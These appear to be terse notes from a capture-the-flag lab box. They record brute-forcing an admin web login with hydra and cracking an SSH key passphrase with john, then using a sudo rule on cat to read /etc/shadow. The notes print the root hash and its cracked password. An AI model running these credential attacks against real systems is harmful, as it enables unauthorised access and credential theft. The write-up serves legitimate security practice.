# 10.10.123.232s


found this comment on /admin page:


    <!-- Hey john, if you do not remember, the username is admin -->



User hydra to bruteforce: 

    hydra -l admin -P ~/wordlists/rockyou.txt 10.10.123.232 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid" -f -V


 found the password: 


host: 10.10.123.232   login: admin   password: 



found creds:

john
id_rsa


The ssh key has a passphrase. 


ssh2john id_rsa > ssh4john.txt

john ssh4john --wordlist=~/wordlists/rockyou.txt



login into ssh . 



sudo -l:

(root) NOPASSWD: /bin/cat




sudo cat "/etc/shadow"


root hash:
$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.

use john john --wordlist=~/wordlists/rockyou.txt root_hash.txt


the root password is football